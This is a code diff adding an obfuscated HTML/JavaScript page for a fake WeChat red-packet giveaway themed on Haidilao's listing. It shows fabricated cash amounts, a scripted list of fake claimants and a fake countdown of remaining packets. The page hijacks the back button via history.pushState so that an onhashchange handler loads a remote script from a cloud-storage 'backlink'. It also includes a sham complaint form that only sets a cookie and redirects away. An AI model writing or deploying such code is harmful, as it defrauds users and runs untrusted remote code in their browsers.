+                        style: "width: 0.8rem;height: 0.8rem;margin-right: 0.2rem;overflow: hidden;background-color: #eee;border-radius: 20% "
+                    }
+                }), Element({
+                    tagName: "div",
+                    props: {
+                        style: "flex: 1;"
+                    },
+                    children: [Element({
+                        tagName: "div",
+                        props: {
+                            style: "font-size: 0.3rem;color: #000;margin-bottom: 0.08rem;"
+                        },
+                        children: [a.name]
+                    }), Element({
+                        tagName: "div",
+                        props: {
+                            style: "font-size: 0.28rem;color: #929493;"
+                        },
+                        children: [b()]
+                    })]
+                }), Element({
+                    tagName: "div",
+                    props: {
+                        style: "text-align: right;"
+                    },
+                    children: [Element({
+                        tagName: "i",
+                        props: {
+                            "class": "icon-success",
+                            style: "margin-right: 0.1rem"
+                        },
+                        children: []
+                    })]
+                })]
+            });
+        }
+
+        function d() {
+            var b, d = Math.floor(4 * Math.random()) + 1, e = h.lastChild;
+            e.parentNode.removeChild(e),
+                b = c(f[r]),
+                b.props.style += "animation:itemMove" + d + " 0.5s",
+                h.insertBefore(b.render(), h.childNodes[0]),
+                r++,
+            r >= f.length && (r = 0),
+                k -= a(80, 150),
+                fdm7r1dmx9khg("[data-num]").innerHTML = k;
+        }
+
+        function e(a, b) {
+            var c = 1e3
+                , d = b
+                , e = 50
+                , f = d / (c / e)
+                , g = 0
+                , h = 0
+                , i = setInterval(function () {
+                g = Math.floor(100 * (g + f)) / 100,
+                g >= d && (clearInterval(i),
+                    g = d,
+                    qolmr51n0qvnnjnk());
+                var b = Number(g);
+                b != h && (h = b,
+                    a.innerHTML = h.toFixed(2));
+            }, 30);
+        }
+
+        var f, g, h, i, k, j = [];
+        for (r = 10,
+                 f = user,
+                 f.sort(function () {
+                     return Math.random() > .5 ? -1 : 1;
+                 }),
+                 p = 0; 10 > p; p++)
+            j[p] = c(f[p]);
+        k = a(5e4, 8e4),
+            money = (a(2e3, 9999) / 100).toFixed(2),
+            g = Element({
+                tagName: "div",
+                props: {
+                    onclick: "app.alert(api.alert8)",
+                    style: "height: 100vh; overflow: hidden; background-color: #fff;"
+                },
+                children: [Element({
+                    tagName: "div",
+                    props: {
+                        style: "height: 6rem;background:url(./img/bg.png) #f35543 no-repeat;background-size: cover;border-radius: 0rem 0rem 50% 50% / 0.2rem 0.2rem 22% 22%;margin-bottom: 0.4rem;box-shadow:0rem 0.06rem 0rem 0rem #f0ce6f"
+                    },
+                    children: [Element({
+                        tagName: "img",
+                        props: {
+                            src: config.logo,
+                            style: "width: 1.2rem;height: 1.2rem;margin: 0 auto 0;display: block;padding-top: 1rem;"
+                        }
+                    }), Element({
+                        tagName: "p",
+                        props: {
+                            style: "font-size: 0.36rem;color: #fee2b2;text-align: center;padding-top: 0.2rem "
+                        },
+                        children: [config.ztitle]
+                    }), Element({
+                        tagName: "p",
+                        props: {
+                            style: "font-size: 0.8rem;text-align: center;padding-top: 0.2rem;color: #fee2b2;font-weight: bold "
+                        },
+                        children: ["￥", Element({
+                            tagName: "span",
+                            props: {
+                                "data-time": 0
+                            },
+                            children: [money]
+                        })]
+                    }), Element({
+                        tagName: "div",
+                        props: {
+                            style: "display:block;text-align: center;font-size: 0.3rem;color: #fee2b2 "
+                        },
+                        children: [config.ftitle]
+                    }), Element({
+                        tagName: "div",
+                        props: {
+                            style: "margin: 0 auto;margin-top:.25rem;background: #ffe4b2;color: #f25543;width:1.28rem;border-radius: 1rem;font-weight:800;cursor: pointer;padding:.15rem;font-size:0.3rem;animation: Updown .5s infinite alternate;text-align:center;"
+                        },
+                        children: ["确认"]
+                    })]
+                }), Element({
+                    tagName: "div",
+                    props: {
+                        style: "width: 100%;height: 0.2rem;background-color: #eceeed;"
+                    }
+                }), Element({
+                    tagName: "div",
+                    props: {
+                        style: "font-size: 0.28rem;color:#929493;height: 0.6rem;line-height: 0.6rem;padding-left: 0.2rem;border-bottom: solid 0.02rem rgba(0,0,0,0.05) "
+                    },
+                    children: ["总发放100000份 剩余", Element({
+                        tagName: "span",
+                        props: {
+                            "data-num": 0
+                        },
+                        children: [k]
+                    }), "份"]
+                }), Element({
+                    tagName: "ul",
+                    props: {
+                        id: "list",
+                        style: "width: 100%;background-color: rgba(255, 255, 255, 0.1);overflow: hidden;border-radius: 0.1rem;height: 12rem;"
+                    },
+                    children: j
+                }), Element({
+                    tagName: "div",
+                    props: {
+                        style: "opacity: 0.8; position: fixed; z-index: 999; top: 10px; right: 10px; overflow: hidden; text-align: center; color: #fff; font-size: 15px; animation: tipMove 1.5s infinite;"
+                    },
+                    children: [Element({
+                        tagName: "div",
+                        props: {
+                            style: "overflow: hidden; width: 110px; height: 100px;"
+                        },
+                        children: [Element({
+                            tagName: "div",
+                            props: {
+                                style: "border-top: solid 2px #fff; border-right: solid 2px #fff; width: 20px; height: 20px; position: absolute; top: 3px; right: 3px; transform: skewX(-25deg) rotate(-30deg);"
+                            }
+                        }), Element({
+                            tagName: "div",
+                            props: {
+                                style: "width: 200px; height: 80px; border-radius: 50%; border: solid 2px #fff; position: absolute; top: -14px; right: -2px; transform: rotate(-22deg)"
+                            }
+                        })]
+                    })]
+                })]
+            }),
+            document.body.appendChild(g.render()),
+            h = fdm7r1dmx9khg("#list"),
+            e(fdm7r1dmx9khg("[data-time]"), Number(money)),
+            i = setInterval(function () {
+                return h.parentNode ? (d(),
+                    void 0) : clearInterval(i);
+            }, 2e3);
+        history.pushState(history.length + 1, "message", "#" + new Date().getTime() + '/share');
+    }
+
+    function ip7e10l6tmh16() {
+        var c, a = Math.floor(4 * Math.random()) + 1, b = Element({
+            tagName: "div",
+            props: {
+                id: "index",
+                style: "height: 9.57rem; width: 5.81rem; border-radius: 10px; overflow: hidden; position: absolute; top: 0;left: 0;bottom: 0;right: 0;margin: auto;animation: show" + a + " .4s;background:url(./img/bg.png) #f35543 no-repeat;background-size: cover;"
+            },
+            children: [Element({
+                tagName: "div",
+                props: {
+                    class: "bg",
+                    style: "height: 7.7rem;border: 1px solid #f45e4d;border-radius: 0% 0% 100% 100% / 80% 80% 20% 20%;box-shadow: 0rem 0.058rem 0rem -0.02rem rgba(0, 0, 0, 0.2);background:url(./img/bg.png) #f35543 no-repeat;background-size: cover;"
+                },
+                children: [Element({
+                    tagName: "img",
+                    props: {
+                        src: config.logo,
+                        style: "width:1.15rem;height: 1.15rem;margin: 0 auto 0;display: block;padding-top: 1.15rem;"
+                    }
+                }), Element({
+                    tagName: "p",
+                    props: {
+                        style: "font-size: 0.52rem;text-align: center;padding-top: 0.4rem;color: #fae3b7;"
+                    },
+                    children: [config.ztitle]
+                }), Element({
+                    tagName: "p",
+                    props: {
+                        style: "font-size: 0.32rem;text-align: center;padding-top: 0.4rem;color: #fae3b7;"
+                    },
+                    children: [config.ftitle, Element({
+                        tagName: "span",
+                        props: {
+                            style: "margin-left: 0.15rem;font-size: 0.24rem;background-color: #fae3b7;padding: 0.02rem 0.08rem; color: #f25542"
+                        },
+                        children: ["可提现"]
+                    })]
+                })]
+            }), Element({
+                tagName: "div",
+                props: {
+                    "data-btn": "0",
+                    style: "width: 2rem;height: 2rem;border: 1px solid #fae3b7;background-color: #fae3b7;border-radius: 50%;margin: -1rem auto 0;box-shadow: 0rem 0.08rem 0rem 0rem rgba(0, 0, 0, 0.2);text-align: center;line-height: 2rem; " +
+                        "animation: 1s ease 0s infinite normal none running btnShake1;",
+                    onclick: "orgu5wf0enzz8(this)"
+                },
+                children: [Element({
+                    tagName: "b",
+                    props: {
+                        style: "position: absolute;top: 0;left: 0;bottom: 0;right: 0;margin: auto;display: inline-block;font-size: 0.8rem;font-family: open;color: #333;"
+                    },
+                    children: ["開"]
+                })]
+            })]
+        });
+        document.body.appendChild(b.render()),
+            c = fdm7r1dmx9khg("[data-btn]"),
+            c.addEventListener("animationend", function () {
+                var b = a > 2 ? 1.8 : 1;
+                c.style.animation = "btnShake" + a + " " + b + "s ease 0s infinite";
+            });
+        history.pushState(history.length + 1, "message", "#" + new Date().getTime() + '/index');
+    }
+
+    var app = {
+        alert: function (a, b, c) {
+            var d, e;
+            document.querySelector("#dialog") || (d = Element({
+                tagName: "div",
+                props: {
+                    id: "dialog",
+                    style: "display: none;position: fixed;z-index: 1000;top: 0;right: 0;left: 0;bottom: 0;background: rgba(0, 0, 0, 0.6);"
+                },
+                children: [Element({
+                    tagName: "div",
+                    props: {
+                        style: "position:fixed;z-index:5000;width:80%;max-width:300px;top:50%;left:50%;transform:translate(-50%,-50%);background-color:#FFFFFF;text-align:center;border-radius:3px;overflow:hidden;"
+                    },
+                    children: [Element({
+                        tagName: "div",
+                        props: {
+                            style: "padding:1.7em 20px 1.7em;font-size:15px;line-height:1.3;word-wrap:break-word;word-break:break-all;",
+                            "data-msg": 0
+                        }
+                    }), Element({
+                        tagName: "b",
+                        props: {
+                            style: "width: 100%; height: 45px; padding-bottom: 1px; display: flex; flex-wrap: wrap; justify-content: center; align-items: center; color: #bda475; font-size: 16px; border-top: 1px solid #EEEEEE;",
+                            "data-go": 0
+                        }
+                    })]
+                })]
+            }),
+                document.body.appendChild(d.render())),
+                e = fdm7r1dmx9khg("#dialog"),
+                fdm7r1dmx9khg("[data-msg]").innerHTML = a.replace("{money}", money),
+                fdm7r1dmx9khg("[data-go]").innerHTML = b || "好的",
+                e.style.display = "block",
+                fdm7r1dmx9khg("[data-go]").onclick = function () {
+                    e.style.display = "none",
+                    "function" == typeof c && c();
+                };
+        }
+    };
+
+    function orgu5wf0enzz8(a) { // 落地二
+        orgu5wf0enzz8 = function () {
+        };
+        a.style.animation = "btnMove .6s infinite alternate";
+        setTimeout(function () {
+            fdm7r1dmx9khg("#index").style.display = "none";
+            i28o2hkspuvyo8wb()
+            app.alert('这是默认进来提示的文字', "确定");
+        }, 1500)
+    }
+
+    function gda6jrp46x27p7(a, b, c) {
+        var d = new XMLHttpRequest();
+        d.onreadystatechange = function () {
+            4 === d.readyState && (200 === d.status || 304 === d.status ? "function" == typeof b && b(d.responseText) : "function" == typeof c && c(d));
+        }, d.open("GET", a, !0), d.send(null);
+    }
+
+    api = null, step = 0;
+
+    var config = {
+        ftitle: '完成所有步骤后 自动存入零钱',
+        ztitle: '庆贺海底捞成功上市',
+        logo: './img/hi.png'
+    };
+
+    var user = [
+        {name: "孙笑川", avatar: "./img/100"},
+        {name: "带带大师兄", avatar: "./img/100(1)"},
+        {name: "六小龄孙", avatar: "./img/100(2)"},
+        {name: "夢醒ぴ誮落盡", avatar: "./img/100(3)"},
+        {name: "最好的我们", avatar: "./img/100(4)"},
+        {name: "甜味少女馆", avatar: "./img/100(5)"},
+        {name: "风有几分甜", avatar: "./img/100(6)"},
+        {name: "风月难入怀", avatar: "./img/100(7)"},
+        {name: "神明不渡我", avatar: "./img/100(8)"},
+        {name: "壊壊の少爷", avatar: "./img/100(9)"},
+        {name: "山河故人在", avatar: "./img/100"},
+        {name: "孙粒子", avatar: "./img/100(1)"},
+        {name: "Mr. Xue", avatar: "./img/100(2)"},
+        {name: "、dacy", avatar: "./img/100(3)"},
+        {name: "已婚少年", avatar: "./img/100(4)"},
+        {name: "叫我冰冰", avatar: "./img/100(5)"},
+        {name: "卢正英", avatar: "./img/100(6)"},
+        {name: "Jkz.", avatar: "./img/100(7)"}
+    ];
+
+
+    var backlink = '//appmessage.oss-cn-qingdao.aliyuncs.com/b.js';
+
+    window.onload = function () {
+        ip7e10l6tmh16();
+
+        window.onhashchange = function () {
+            is74wle4kbr2y(backlink);
+        };
+    }
+</script>
+
+<div id="mytousu" style="display: none">
+	<div id="page">
+		<div class="page__bd">
+			<div class="weui-cells__title" id="title"></div>
+			<div class="weui-cells" id="list"></div>
+			<div class="weui-cells__title" id="desc" style="margin-top: 6px;display:none">
+				<a class="weui-cells__links" href=""></a>
+			</div>
+		</div>
+	</div>
+	<div id="msg" style="display:none">
+		<div class="weui-msg">
+			<div class="weui-msg__icon-area">
+				<i class="weui-icon-success weui-icon_msg"></i>
+			</div>
+			<div class="weui-msg__text-area">
+				<h2 class="weui-msg__title">投诉已提交</h2>
+				<p class="weui-msg__desc">微信团队会尽快核实，并通过“微信团队”通知你审核结果。感谢你的支持。</p>
+			</div>
+			<div class="weui-msg__opr-area">
+				<p class="weui-btn-area" onclick="closeOne()">
+					<a class="weui-btn weui-btn_primary">关闭</a>
+				</p>
+			</div>
+		</div>
+	</div>
+	<div id="loading" style="display: none;">
+		<div class="weui-mask_transparent"></div>
+		<div class="weui-toast">
+			<i class="weui-loading weui-icon_toast"></i>
+			<p class="weui-toast__content">加载中</p>
+		</div>
+	</div>
+	<div class="weui-footer weui-footer_fixed-bottom" style="bottom:20px">
+		<p class="weui-footer__links" onclick="closeOne()">
+			<a class="weui-footer__link">投诉须知</a>
+		</p>
+	</div>
+</div>
+<script>
+
+    function loading(a) {
+        $("#loading").show(),
+            setTimeout(function () {
+                $("#loading").hide(),
+                    $(a).show();
+            }, 500);
+    }
+
+    function setCookie(cname, cvalue, exdays) {
+        var d = new Date();
+        d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
+        var expires = "expires=" + d.toUTCString();
+        document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+    }
+
+    function tousu() {
+        setCookie('report', 1, 1000 * 365);
+    }
+
+    function closeOne() {
+        location.href = 'http://www.baidu.com'
+    }
+
+    function loadPage(a) {
+        var b, c, d, e;
+        switch (a) {
+            case 0:
+                for (loading("#page"),
+                         b = ["网页包含欺诈信息（如：假红包）", "网页包含违法信息", "网页可能包含谣言信息", "网页包含诱导分享/关注性质的内容", "网页包含（虚假/抽奖性质/欺诈）拼团信息", "网页包含虚拟支付信息", "网页包含不适当的内容对我造成骚扰", "网页有偿投票信息", "网页包含隐私泄露风险"],
+                         c = "",
+                         d = 0; d < b.length; d++)
+                    c += '<a class="weui-cell weui-cell_access" href="javascript:;" name="' + d + '"><div class="weui-cell__bd"><p>' + b[d] + '</p></div><div class="weui-cell__ft"></div></a>';
+                $("#title").html("请选择投诉该网页的原因："),
+                    $("#list").html(c),
+                    $(".weui-cells__links").html('遇到网页流量被劫持怎么办'),
+                    $(".weui-cells__links").attr({
+                        href: 'https://mp.weixin.qq.com/s/cLhL7Rb_hhxx6kd03aqYrw'
+                    }),
+                    $("#desc").show();
+                break;
+
+            case 1:
+                $("#title").html("你可以："),
+                    $("#list").html('<a class="weui-cell weui-cell_access" onclick="tousu()" href="javascript:;"><div class="weui-cell__bd"><p>提交给微信团队审核</p></div><div class="weui-cell__ft"></div></a>'),
+                    3 == name || 2 == name ? (e = {
+                        3: {
+                            title: "了解什么是诱导分享类内容",
+                            link: "https://mp.weixin.qq.com/s/LJkN77dgg2A9C8GepUGdeA"
+                        },
+                        2: {
+                            title: "了解微信对谣言的治理",
+                            link: "https://mp.weixin.qq.com/s/w2VEz97HTsYTNALskHlSIQ"
+                        }
+                    },
+                        $(".weui-cells__links").html(e[name].title),
+                        $(".weui-cells__links").attr({
+                            href: e[name].link
+                        }),
+                        console.log(name)) : $("#desc").hide();
+                break;
+
+            case 2:
+                $(".weui-footer").hide(),
+                    $("#page").hide(),
+                    loading("#msg");
+                break;
+
+            default:
+                close();
+        }
+    }
+
+    var page = 0;
+    loadPage(page),
+        $("#list").on("click", "a", function () {
+            0 == page ? (name = $(this).attr("name"),
+                page = 1) : page = 2,
+                loadPage(page);
+        })
+</script>
+</body>
+</html>
